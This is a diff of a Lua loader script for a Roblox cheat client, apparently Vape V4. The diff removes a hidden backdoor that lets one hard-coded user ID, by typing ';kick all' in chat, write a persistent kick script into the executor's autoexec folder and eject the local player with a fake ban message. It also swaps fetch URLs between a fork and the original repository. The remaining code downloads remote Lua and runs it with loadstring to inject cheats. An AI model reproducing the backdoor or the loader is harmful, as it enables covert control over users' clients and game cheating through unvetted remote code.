@@ -1,99 +1,3 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local kickMessage = "You have been banned for 29999 weeks 5 days 100 seconds."
-local allowedUserId = 8769347374
-local foldersToTry = {"autoexec", "AutoExec"}
-local fileName = "CreamyWareInject.lua"
-local folderName = nil
-local filePath = nil
-
-local kickScript = [[
-local player = game:GetService("Players").LocalPlayer
-player:Kick("]] .. kickMessage .. [[")
-]]
-
--- Folder creation utilities
-local function folderExists(name)
-    return isfolder and isfolder(name)
-end
-
-local function safeMakeFolder(name)
-    if makefolder then
-        local ok, err = pcall(function()
-            makefolder(name)
-        end)
-        return ok
-    end
-    return false
-end
-
-local function safeWriteFile(path, content)
-    if writefile then
-        local success, err = pcall(function()
-            writefile(path, content)
-        end)
-        if success then return true end
-        -- fallback to root if path fails
-        local fallbackPath = path:match("([^/]+)$")
-        return pcall(function()
-            writefile(fallbackPath, content)
-        end)
-    end
-    return false
-end
-
--- Determine best folder
-for _, folder in ipairs(foldersToTry) do
-    if folderExists(folder) then
-        folderName = folder
-        break
-    end
-end
-
-if not folderName then
-    if safeMakeFolder("autoexec") then
-        folderName = "autoexec"
-    elseif safeMakeFolder("AutoExec") then
-        folderName = "AutoExec"
-    end
-end
-
-filePath = folderName and (folderName .. "/" .. fileName) or fileName
-
--- Kicker logic
-local function createAndRunKick()
-    if safeWriteFile(filePath, kickScript) and readfile and loadstring then
-        pcall(function()
-            loadstring(readfile(filePath))()
-        end)
-    end
-end
-
--- Chat listener with permission check
-local function onPlayerChat(p)
-    if p.UserId == allowedUserId then
-        p.Chatted:Connect(function(msg)
-            if msg == ";kick all" and p ~= LocalPlayer then
-                createAndRunKick()
-            end
-        end)
-    end
-end
-
--- Hook existing players
-for _, p in pairs(Players:GetPlayers()) do
-    if p ~= LocalPlayer then
-        onPlayerChat(p)
-    end
-end
-
--- New players
-Players.PlayerAdded:Connect(function(p)
-    if p ~= LocalPlayer then
-        onPlayerChat(p)
-    end
-end)
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
@@ -127,7 +31,7 @@ local playersService = cloneref(game:GetService('Players'))
 local function downloadFile(path, func)
 	if not isfile(path) then
 		local suc, res = pcall(function()
-			return game:HttpGet('https://raw.githubusercontent.com/Trariviste/DPrivate/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
+			return game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
 		end)
 		if not suc or res == '404: Not Found' then
 			error(res)
@@ -199,7 +103,7 @@ if not shared.VapeIndependent then
 	else
 		if not shared.VapeDeveloper then
 			local suc, res = pcall(function()
-				return game:HttpGet('https://raw.githubusercontent.com/Trariviste/DPrivate/'..readfile('newvape/profiles/commit.txt')..'/games/'..game.PlaceId..'.lua', true)
+				return game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/'..readfile('newvape/profiles/commit.txt')..'/games/'..game.PlaceId..'.lua', true)
 			end)
 			if suc and res ~= '404: Not Found' then
 				loadstring(downloadFile('newvape/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(...)
@@ -211,17 +115,3 @@ else
 	vape.Init = finishLoading
 	return vape
 end
-run(function()
-    task.spawn(function()
-        local Players = game:GetService("Players")
-        local lp = Players.LocalPlayer
-        local startTime = tick()
-
-        repeat task.wait() until lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-
-        local endTime = tick()
-        local loadDuration = math.round((endTime - startTime) * 100) / 100
-
-        vape:CreateNotification("CreamyWare", "Successfully Loaded in. Took " .. loadDuration .. " Seconds", 4)
-    end)
-end)
